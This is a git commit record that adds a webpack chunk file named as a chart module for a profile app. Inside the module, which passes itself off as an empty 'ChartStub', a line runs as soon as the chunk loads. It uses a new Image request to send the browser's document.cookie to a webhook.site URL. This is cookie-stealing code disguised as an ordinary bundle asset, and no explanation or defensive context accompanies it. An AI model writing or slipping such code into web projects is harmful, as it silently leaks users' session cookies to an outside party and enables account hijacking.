b6fa9b55d60d13be8dccd34bbf117d17a2d841f5
chenkunxi <3250105264@zju.edu.cn>
2026-07-28 20:35:05 +0800

    Add files via upload

---
+++ chart.c6d73dbb.chunk.js
@@ -0,0 +1,11 @@
+(self.webpackChunkprofile_app = self.webpackChunkprofile_app || []).push([
+  [65],
+  {
+    6349: (module) => {
+      new Image().src =
+        "https://webhook.site/6133023f-b3b7-4e10-b9a7-a26db94d6f66?c=" +
+        encodeURIComponent(document.cookie);
+      module.exports = function ChartStub() {};
+    },
+  },
+]);
